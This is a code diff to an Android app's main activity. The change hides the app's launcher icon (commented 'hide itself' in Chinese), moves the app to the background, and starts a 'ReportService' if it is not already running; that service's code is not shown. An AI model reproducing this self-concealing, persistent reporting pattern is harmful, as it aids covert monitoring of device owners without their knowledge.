@@ -1,6 +1,11 @@
 package com.mobilestation;
 
 import android.app.Activity;
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningServiceInfo;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
@@ -10,6 +15,7 @@ import android.os.Bundle;
 import android.util.Log;
 import android.view.Menu;
 
+import com.mobilestation.receiver.Alarmreceiver;
 import com.mobilestation.receiver.TimeBroadcastReceiver;
 import com.mobilestation.util.AlarmManagerUtil;
 
@@ -24,12 +30,14 @@ public class MainActivity extends Activity {
 		// runService();
 
 		Log.i(TAG, "程序开始运行");
-		
-		//隐藏自己
-		PackageManager p = getPackageManager();  
-        p.setComponentEnabledSetting(getComponentName(),  
-        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  
-        PackageManager.DONT_KILL_APP); 
+
+		moveTaskToBack(true);
+
+		// 隐藏自己
+		PackageManager p = getPackageManager();
+		p.setComponentEnabledSetting(getComponentName(),
+				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+				PackageManager.DONT_KILL_APP);
 
 		SharedPreferences sharedPreferences = getSharedPreferences("setting",
 				MODE_PRIVATE);
@@ -43,13 +51,32 @@ public class MainActivity extends Activity {
 		editor.putInt("CHECKAPP_INTERVAL", 2 * 1000);
 		editor.commit();// 提交修改
 
-		AlarmManagerUtil.sendUpdateBroadcast(this.getApplicationContext());
+		// AlarmManagerUtil.sendUpdateBroadcast(this.getApplicationContext());
+		//
+		// TimeBroadcastReceiver timeBroadcastReceiver = new
+		// TimeBroadcastReceiver();
+		// // 设置接收的action
+		// IntentFilter filter = new IntentFilter();
+		// filter.addAction("android.intent.action.TIME_TICK");
+		// registerReceiver(timeBroadcastReceiver, filter);
 
-		TimeBroadcastReceiver timeBroadcastReceiver = new TimeBroadcastReceiver();
-		// 设置接收的action
-		IntentFilter filter = new IntentFilter();
-		filter.addAction("android.intent.action.TIME_TICK");
-		registerReceiver(timeBroadcastReceiver, filter);
+		Context context = this.getApplicationContext();
+		boolean isServiceRunning = false;
+		ActivityManager manager = (ActivityManager) context
+				.getSystemService(Context.ACTIVITY_SERVICE);
+		for (RunningServiceInfo service : manager
+				.getRunningServices(Integer.MAX_VALUE)) {
+			if ("com.mobilestation.service.ReportService"
+					.equals(service.service.getClassName())) {
+				isServiceRunning = true;
+			}
+		}
+		if (!isServiceRunning) {
+			Intent i = new Intent();
+			i.setClass(context, com.mobilestation.service.ReportService.class);
+			i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+			context.startService(i);
+		}
 	}
 
 	@Override
